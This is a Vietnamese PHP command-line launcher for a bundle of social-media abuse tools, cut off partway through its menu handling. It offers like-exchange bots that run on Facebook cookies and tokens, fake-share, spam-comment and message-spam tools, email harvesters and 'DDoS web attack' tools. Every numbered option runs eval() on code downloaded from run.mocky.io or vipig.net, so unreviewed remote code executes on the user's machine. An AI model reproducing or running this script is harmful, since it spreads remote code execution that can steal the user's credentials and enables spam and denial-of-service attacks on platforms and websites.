<?php
error_reporting(0);
session_start();
/////Key Tool/////
system('clear');
while (true){
$checkkey  = file('https://zalo.me/g/oztnqp046'); 
echo "\033[1;96mLưu Ý Vào Box Ib ad để lấy key\n";
echo "\033[1;93mBoxlấy key:\033[1;91m https://zalo.me/g/oztnqp046\n"; 
echo "\033[1;92mNhập Key Để Vào Tool: \033[1;33m";
 
    if (trim(fgets(STDIN)) == "5") {
    sleep(0.10);
        echo "\033[1;35mKey Đúng Đợi Vào Tool\n";
        break;
    } else {
        echo "\033[1;91mKey Sai Vui Lòng Lấy Lại\n";
        echo "\033[1;93m-------------------------------------------------------------\n";
        sleep(1);
       continue;
       }
}
error_reporting(0);
session_start();
date_default_timezone_set('Asia/Ho_Chi_Minh');
/***[ Color ]***/
$xnhac = "\033[1;36m";
$do = "\033[1;31m";
$luc = "\033[1;32m";
$vang = "\033[1;33m";
$xduong = "\033[1;34m";
$hong = "\033[1;35m";
$trang = "\033[1;37m";
/***[ USERAGENT ]***/
$_SESSION['useragent'] = 'Mozilla/5.0 (Linux; Android 10; CPH1819) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36';
/***[ Đánh Dấu Bản Quyền ]***/
$thanh_dep = $do."[" . $trang . "=.=" . $do . "] ".$trang."=> ";
$thanh_xau = $do."[" . $trang . "=.=" . $do . "] ";
/***[ Delay ]***/
if (strtoupper(substr(PHP_OS, 0, 3)) === 'LIN') {
    $_SESSION['load'] = 200;
} else {
    $_SESSION['load'] = 0;
}
/***[ Banner ]***/
$banner = "
\033[1;34m HUỲNH VĂN VŨ🥰🥰🥰🥰         
\033[1;37m ZALO:0373800841
\033[1;34mC》》》》 BẢN QUYỀN TOOL THUỘC VỀ HVV《《《《《《
\033[1;37m           
\033[1;34m 
\033[1;37m  
\033[1;31m────────────────────────────────────────────────────────────
\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;33mTOOL GỘP VIP X HVV
\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;35mADMIN: \033[1;36mHUYNH VAN Vu
\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;36mWEB BÁN RANDOM RẺ DỄ NỔ: \033[1;31mADMIN WED:TRUMACCFF.COM
\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mBOX RANDOM: \033[1;37mhttps://zalo.me/g/oztnqp046
\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;34mFACEBOOK: \033[1;37mhttps://www.facebook.com/hvv2008
\033[1;31m────────────────────────────────────────────────────────────\n";
@system("HUỲNH VĂN VŨ");
/***[ Clear + HUYNH VAN VU ]***/
if (strtoupper(substr(PHP_OS, 0, 3)) === 'VŨ') { 
    @system('Huỳnh Văn Vũ'); 
} else { 
    @system('HUỲNH VĂN VŨ'); 
}
for($i = 0; $i < strlen($banner); $i++){echo $banner[$i];usleep(500);}
$day = [];
$day= date('d-m-y');
$today = date("d-m-y");
$d = date("d-m");
@system('clear');
for($i = 0; $i < strlen($banner); $i++){echo $banner[$i];usleep(500);}
sleep(1);
echo "\033[1;32m╔════════════════════════╗\n";
echo "\033[1;32m║     \033[1;36mThông Tin Key:\033[1;32m║\n";
echo "\033[1;32m╚════════════════════════╝\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mTên Người Mua Key: ".$vang.$get_qdc['name']."\n"; 
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNgày Mua Key : ".$vang.$get_qdc['create']."\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNgày hết hạn: ".$vang.$get_qdc['end']."\n"; 
echo "\e[1;31m".str_repeat('──', 32)."\n";
usleep(50000);
echo "\033[1;32m╔═════════════════════╗\n";
echo "\033[1;32m║  \033[1;36mTool Trao Đổi Sub  \033[1;32m║\n";
echo "\033[1;32m╚═════════════════════╝\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m1.3\033[1;31m] \033[1;32mTool TDS Token \033[1;31m[\033[1;33mMới\033[1;31m]\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m1.4\033[1;31m] \033[1;32mTool TDS Token \033[1;31m[\033[1;33mĐa Luồng\033[1;31m] \n";
usleep(50000);
echo "\e[1;31m".str_repeat('──', 32)."\n";
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m1.5\033[1;31m] \033[1;32mTool TDS Cookie \033[1;31m[\033[1;33mMới\033[1;31m]\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m1.6\033[1;31m] \033[1;32mTool TDS Cookie \033[1;31m[\033[1;33mMới\033[1;31m] \033[1;31m[\033[1;33mV1\033[1;31m] \n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m8\033[1;31m] \033[1;32mTool TraoDoiSub Đa Cookie \033[1;31m[\033[1;33mNhiệm Vụ Cảm Xúc\033[1;31m] \n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m9\033[1;31m] \033[1;32mTool TraoDoiSub Đa Cookie \033[1;31m[\033[1;33mNhiệm Vụ Cảm Xúc\033[1;31m] \033[1;31m[\033[1;33mV1\033[1;31m] \n";
usleep(50000);
echo "\e[1;31m".str_repeat('──', 32)."\n";
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m10\033[1;31m] \033[1;32mTool TOPIG.VN Đa Luồng\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m1.7\033[1;31m] \033[1;32mTool TOPIG.VN Đa Luồng \033[1;31m[\033[1;33mV2\033[1;31m] \n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m11\033[1;31m] \033[1;32mTool TDS TikTok \n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m12\033[1;31m] \033[1;32mTool TDS Youtube \n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m1.8\033[1;31m] \033[1;32mTool TraoDoiSub Tik Tok \033[1;31m[\033[1;33mV1\033[1;31m] \n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m1.9\033[1;31m] \033[1;32mTool TraoDoiSub Tik Tok \033[1;31m[\033[1;33mMới\033[1;31m] \033[1;31m[\033[1;33mLàm Mỗi Follow\033[1;31m] \033[1;31m[\033[1;33mBảo Trì\033[1;31m] \n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m13\033[1;31m] \033[1;32mTool TraoDoiSub Tik Tok Now \033[1;31m[\033[1;33mMới\033[1;31m] \033[1;31m[\033[1;33mBảo Trì\033[1;31m] \n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m2.0\033[1;31m] \033[1;32mTool TraoDoiSub Pro5 \033[1;31m[\033[1;33mMới\033[1;31m] \n";
echo "\e[1;31m".str_repeat('──', 32)."\n";
usleep(50000);
echo "\033[1;32m╔═══════════════════════╗\n";
echo "\033[1;32m║  \033[1;36mTool Tương Tác Chéo  \033[1;32m║\n";
echo "\033[1;32m╚═══════════════════════╝\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m2.1\033[1;31m] \033[1;32mTool TTC Token \033[1;33m(Mới) \n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m2.2\033[1;31m] \033[1;32mTool TTC Token \033[1;33m(Mới) \033[1;31m[\033[1;33mV2\033[1;31m] \n";
usleep(50000);
echo "\e[1;31m".str_repeat('──', 32)."\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m2.3\033[1;31m] \033[1;32mTool TTC Cookie \033[1;33m(Mới)\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m2.4\033[1;31m] \033[1;32mTool TTC Cookie \033[1;33m(Mới) \033[1;31m[\033[1;33mV2\033[1;31m] \n";
echo "\e[1;31m".str_repeat('──', 32)."\n";
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m14\033[1;31m] \033[1;32mTool VIPIG.NET Đa Luồng\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m15\033[1;31m] \033[1;32mTool TTC TikTok\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m16\033[1;31m] \033[1;32mTool TTC Youtube \n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m17\033[1;31m] \033[1;32mTool TTC Youtube\033[1;97m (Auto)\033[1;93m \n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m2.5\033[1;31m] \033[1;32mTool TTC Youtube Đa Luồng\033[1;97m (Auto)\033[1;93m (Mới) \n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m2.6\033[1;31m] \033[1;32mTool TTC Tik Tok \033[1;31m[\033[1;33mProxy\033[1;31m] \n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m2.7\033[1;31m] \033[1;32mTool TTC Tik Tok \033[1;31m[\033[1;33mV2\033[1;31m] \n";
echo "\e[1;31m".str_repeat('──', 32)."\n";
usleep(50000);
echo "\033[1;32m╔══════════════════════════╗\n";
echo "\033[1;32m║ \033[1;36mNuôi Facebook + Tiện Ích \033[1;32m║\n";
echo "\033[1;32m╚══════════════════════════╝\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m18\033[1;31m] \033[1;32mTool Reg Page Vị Trí \033[1;31m[\033[1;33mMới\033[1;31m]\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m19\033[1;31m] \033[1;32mTool Reg Page Chính \033[1;31m[\033[1;33mMới\033[1;31m]\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m20\033[1;31m] \033[1;32mTool Share Ảo Max Speed Cookie \033[1;31m[\033[1;33mMới\033[1;31m]\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m2.8\033[1;31m] \033[1;32mTool Share Ảo Max Speed Cookie V2 \033[1;31m[\033[1;33mMới\033[1;31m] \n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m21\033[1;31m] \033[1;32mTool Share Ảo Cookie Mã 2FA \033[1;31m[\033[1;33mMới\033[1;31m]\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m22\033[1;31m] \033[1;32mTool Thêm Bạn Facebook \033[1;31m[\033[1;33mMới\033[1;31m]\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m23\033[1;31m] \033[1;32mTool Hủy Follow Facebook \033[1;31m[\033[1;33mMới\033[1;31m]\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m24\033[1;31m] \033[1;32mTool Get ID Facebook \033[1;31m[\033[1;33mMới\033[1;31m]\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m25\033[1;31m] \033[1;32mTool Nuôi Facebook \033[1;31m[\033[1;33mLike + Add + Comment\033[1;31m] \033[1;31m[\033[1;33mMới\033[1;31m]\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m26\033[1;31m] \033[1;32mTool Nuôi Facebook \033[1;31m[\033[1;33mLike + Add\033[1;31m] \033[1;31m[\033[1;33mMới\033[1;31m]\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m27\033[1;31m] \033[1;32mTool Khiên Avatar Facebook \033[1;31m[\033[1;33mBật/Tắt\033[1;31m] \n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m28\033[1;31m] \033[1;32mTool Auto Chấp Nhận Kết Bạn \n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m29\033[1;31m] \033[1;32mTool GET ID FACEBOOK \n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m30\033[1;31m] \033[1;32mTool Tự Động Bình Luận Ngẫu Nhiên \033[1;31m[\033[1;33mMới\033[1;31m]\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m31\033[1;31m] \033[1;32mTool Lấy Token Facebook \033[1;31m[\033[1;33mMới\033[1;31m] \033[1;31m[\033[1;33mBảo Trì\033[1;31m]\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m32\033[1;31m] \033[1;32mTool Spam comment 1 ID \033[1;31m[\033[1;33mMới\033[1;31m]\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m33\033[1;31m] \033[1;32mTool Spam Comment Group \033[1;31m[\033[1;33mKèm Ảnh, Gif\033[1;31m] \033[1;31m[\033[1;33mBảo Trì\033[1;31m]\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m34\033[1;31m] \033[1;32mTool Chọc Bạn Bè Để Lấy Tương Tác\n"; 
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m35\033[1;31m] \033[1;32mTool Auto Kết Bạn Gợi Ý \n"; 
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m36\033[1;31m] \033[1;32mTool Buff Follow Bằng Page Vị Trí \n"; 
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m37\033[1;31m] \033[1;32mTool Chuyển Page vị trí \n"; 
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m39\033[1;31m] \033[1;32mTool Xem thông tin Trang Cá Nhân Bằng Token \n"; 
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m40\033[1;31m] \033[1;32mTool Chuyển Cookie Sang Token Đa Luồng \033[1;31m[\033[1;33mMới\033[1;31m]\n";
usleep(50000);
echo "\e[1;31m".str_repeat('──', 32)."\n";
usleep(50000); 
echo "\033[1;32m╔══════════════════════════╗\n";
echo "\033[1;32m║ \033[1;36m    Tool Spam Message  \033[1;32m  ║\n";
echo "\033[1;32m╚══════════════════════════╝\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m2.9\033[1;31m] \033[1;32mTool Spam Message \033[1;31m[\033[1;33mMới\033[1;31m]\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m3.0\033[1;31m] \033[1;32mTool Spam Message \033[1;31m[\033[1;33mMới\033[1;31m] \033[1;31m[\033[1;33mV2\033[1;31m]\n";
echo "\e[1;31m".str_repeat('──', 32)."\n";
usleep(50000);
echo "\033[1;32m╔══════════════════════════╗\n";
echo "\033[1;32m║ \033[1;36m Tool Khác + Tiện Ích    \033[1;32m║\n";
echo "\033[1;32m╚══════════════════════════╝\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m41\033[1;31m] \033[1;32mTool Giải Mã PHP \n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m42\033[1;31m] \033[1;32mTool Mã Hóa PHP \033[1;31m[\033[1;33mMới\033[1;31m]\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m43\033[1;31m] \033[1;32mTool Đào Mail Ngẫu nhiên \033[1;31m[\033[1;33mMới\033[1;31m]\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m44\033[1;31m] \033[1;32mTool Đào Mail Theo Đuôi \033[1;31m[\033[1;33mMới\033[1;31m]\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m45\033[1;31m] \033[1;32mTool Đào Key Hma \033[1;31m[\033[1;33mMới\033[1;31m]\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m46\033[1;31m] \033[1;32mTool Đếm Lần Yêu \033[1;31m[\033[1;33mMới\033[1;31m] \033[1;31m[\033[1;33mV2\033[1;31m]\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m47\033[1;31m] \033[1;32mTool Troll Quét Virus Điện Thoại \033[1;31m[\033[1;33mMới\033[1;31m]\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m48\033[1;31m] \033[1;32mTool Troll Lấy Thông Tin Điện thoại \033[1;31m[\033[1;33mMới\033[1;31m]\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m49\033[1;31m] \033[1;32mTool Spam Tin Nhắn \033[1;31m[\033[1;33mMới\033[1;31m]\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m50\033[1;31m] \033[1;32mTool Ddos Web \033[1;31m[\033[1;33mMới\033[1;31m]\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m51\033[1;31m] \033[1;32mTool Ddos Web Attack \033[1;31m[\033[1;33mMới\033[1;31m]\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m52\033[1;31m] \033[1;32mTool Đào Mail + Check Live + Check Valid FB \n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m53\033[1;31m] \033[1;32mTool Reg Tài Khoản Garena \033[1;31m[\033[1;33mMới\033[1;31m]\n";
echo "\e[1;31m".str_repeat('──', 32)."\n";
usleep(50000);
echo "\033[1;32m╔══════════════════════════╗\n";
echo "\033[1;32m║ \033[1;36m   Check Xu Đa Luồng     \033[1;32m║\n";
echo "\033[1;32m╚══════════════════════════╝\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m54\033[1;31m] \033[1;32mTool Check Xu + Lưu Token TDS \033[1;31m[\033[1;33mMới\033[1;31m]\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m55\033[1;31m] \033[1;32mTool Check Xu TTC \033[1;31m[\033[1;33mMới\033[1;31m]\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m56\033[1;31m] \033[1;32mTool Check Xu Vipig \033[1;31m[\033[1;33mMới\033[1;31m]\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m3.1\033[1;31m] \033[1;32mTool Check Xu TDS \033[1;31m[\033[1;33mMới\033[1;31m] \033[1;31m[\033[1;33mV1\033[1;31m]\n";
usleep(50000);
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;31m[\033[1;33m3.2\033[1;31m] \033[1;32mTool Check Xu TTC \033[1;31m[\033[1;33mMới\033[1;31m] \033[1;31m[\033[1;33mV1\033[1;31m]\n";
echo "\e[1;31m".str_repeat('──', 32)."\n";
usleep(50000);
sleep(1);
while(true){
echo"\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;32mNhập Số \033[1;37m===>: \033[1;33m";
$chonloaitool = trim(fgets(STDIN));
////Tool Tds
if($chonloaitool == '1.3'){
eval(file_get_contents('https://run.mocky.io/v3/c7834370-11c4-448d-87d2-451f12102865'));
} else if($chonloaitool == '1.4'){
eval(file_get_contents('https://run.mocky.io/v3/6f47fabd-0bca-47b4-ba66-dc0c18010445'));
} else if($chonloaitool == '1.5'){
eval(file_get_contents('https://run.mocky.io/v3/a4684d5c-e819-4caa-b491-f400e3262e24'));
} else if($chonloaitool == '1.6'){
eval(file_get_contents('https://run.mocky.io/v3/2ee7b823-deda-4f26-a2f0-65eb26e6683f'));
} else if($chonloaitool == '8'){
eval(file_get_contents('https://run.mocky.io/v3/342f0acc-94df-4edc-8378-4d4a94046c7d'));
} else if($chonloaitool == '9'){
eval(file_get_contents('https://run.mocky.io/v3/f145c704-0359-4fff-9f14-22bdbd646dd4'));
} else if($chonloaitool == '10'){
eval(file_get_contents('https://run.mocky.io/v3/eb87c931-e227-460c-bfca-58db2f8496ce'));
} else if($chonloaitool == '1.7'){
eval(file_get_contents('https://run.mocky.io/v3/c22eea2f-43b7-4749-ab6e-91111ec0bc35'));
} else if($chonloaitool == '11'){
eval(file_get_contents('https://run.mocky.io/v3/0fe2c655-f8a2-42cd-b33c-dee71cbe635a'));
} else if($chonloaitool == '12'){
eval(file_get_contents('https://run.mocky.io/v3/1e93c3d9-adae-437b-ac19-a3f98c1d007d'));
} else if($chonloaitool == '1.8'){
eval(file_get_contents('https://run.mocky.io/v3/888c568b-082d-4a92-b0fb-33b140a533d0'));
} else if($chonloaitool == '1.9'){
eval(file_get_contents('xxxxxxxxxxxx'));
} else if($chonloaitool == '13'){
eval(file_get_contents('xxxxxxxxxxxxxxxx'));
} else if($chonloaitool == '2.0'){
eval(file_get_contents('https://run.mocky.io/v3/066ad174-3a95-48a4-b8d1-9f9bc30e3f01'));
////Tool TTC
} else if($chonloaitool == '2.1'){
eval(file_get_contents('https://run.mocky.io/v3/5150dcf2-ca8a-4fa3-9f88-f38fa381955b'));
} else if($chonloaitool == '2.2'){
eval(file_get_contents('https://run.mocky.io/v3/5150dcf2-ca8a-4fa3-9f88-f38fa381955b'));
} else if($chonloaitool == '2.3'){
eval(file_get_contents('https://run.mocky.io/v3/5d8663b7-1c9e-4cb5-b666-74ca8fc7f277'));
} else if($chonloaitool == '2.4'){
eval(file_get_contents('https://run.mocky.io/v3/e9567c7f-779f-40d6-b533-b92ca1eba88a'));
} else if($chonloaitool == '14'){
eval(file_get_contents('https://vipig.net/tool/toolvipig.txt'));
} else if($chonloaitool == '15'){
eval(file_get_contents('https://run.mocky.io/v3/175bf294-a4f2-43df-8330-1b2f1e083969'));
} else if($chonloaitool == '16'){
eval(file_get_contents('https://run.mocky.io/v3/a0fedc26-0206-4451-98a2-2c548e57bbe4'));
} else if($chonloaitool == '17'){
eval(file_get_contents('https://run.mocky.io/v3/09623700-6c31-44d8-ae3c-a62b4b5027c6'));
} else if($chonloaitool == '2.5'){
eval(file_get_contents('https://run.mocky.io/v3/4659ca47-041c-4fcd-9fb4-237891ac1eb8'));
} else if($chonloaitool == '2.6'){
eval(file_get_contents('https://run.mocky.io/v3/6492d87c-994f-4bc4-bfc8-a88570706c10'));
} else if($chonloaitool == '2.7'){
eval(file_get_contents('https://run.mocky.io/v3/851ab7ee-c495-4ef8-9c33-8a3465ab4734'));
/////Tool Facebook
} else if($chonloaitool == '18'){
eval(file_get_contents('https://run.mocky.io/v3/5b3d6d3d-699c-4456-a699-252483645532'));
} else if($chonloaitool == '19'){
eval(file_get_contents('https://run.mocky.io/v3/36931a71-3505-4fe9-9d9c-4894e7092fc5'));
} else if($chonloaitool == '20'){
eval(file_get_contents('https://run.mocky.io/v3/a1196983-9e28-47b8-bce9-ca0efe676202'));
} else if($chonloaitool == '2.8'){
eval(file_get_contents('https://run.mocky.io/v3/013064bc-9c5a-48d4-906d-bcd1aa9c3ed6'));
} else if($chonloaitool == '21'){
eval(file_get_contents('https://run.mocky.io/v3/49ba2de7-bdd9-44c8-b116-e979d1985dfb'));
} else if($chonloaitool == '22'){
eval(file_get_contents('https://run.mocky.io/v3/fdd5dc5f-68b1-40dd-86f4-7f12d4cd3e87'));
} else if($chonloaitool == '23'){
eval(file_get_contents('https://run.mocky.io/v3/1aa062ff-08aa-4987-9b1a-0d701d69f6ee'));
} else if($chonloaitool == '24'){
eval(file_get_contents('https://run.mocky.io/v3/0d98b6aa-4a82-4db5-a06a-26d1e1bdfd17'));
} else if($chonloaitool == '25'){
eval(file_get_contents('https://run.mocky.io/v3/44459479-e630-49bd-baf8-05de62968f90'));
} else if($chonloaitool == '26'){
eval(file_get_contents('https://run.mocky.io/v3/fa6cf802-60ed-44f2-b91a-05b0b53e00c5')); 
} else if($chonloaitool == '27'){
eval(file_get_contents('https://run.mocky.io/v3/dd11b889-7355-412b-815d-54f63fde8355'));
} else if($chonloaitool == '28'){
eval(file_get_contents('https://run.mocky.io/v3/8e0fd2c0-0018-4302-879a-6ee0e879476e'));
} else if($chonloaitool == '29'){
eval(file_get_contents('https://run.mocky.io/v3/dd21c2eb-85e7-4ec3-b50c-192f75c1efa9'));
} else if($chonloaitool == '30'){
eval(file_get_contents('https://run.mocky.io/v3/55cea4ee-1d91-49f5-9218-15487d086e01'));
} else if($chonloaitool == '31'){
eval(file_get_contents('https://run.mocky.io/v3/14286458-f127-4470-8e13-a61971e3c621'));
} else if($chonloaitool == '32'){
eval(file_get_contents('xxxxxxx'));
} else if($chonloaitool == '33'){
eval(file_get_contents('https://run.mocky.io/v3/32c2c065-a939-44fd-b91a-0fa491baf8c9'));
} else if($chonloaitool == '34'){
eval(file_get_contents('xxxxxx'));
} else if($chonloaitool == '35'){
eval(file_get_contents('https://run.mocky.io/v3/ba9e17ec-7f05-4d0a-8cbc-8f8fbed7a33f'));
} else if($chonloaitool == '36'){
eval(file_get_contents('https://run.mocky.io/v3/13a3eff3-af3c-4003-a3bc-ba09c4cd4eb3'));
} else if($chonloaitool == '37'){
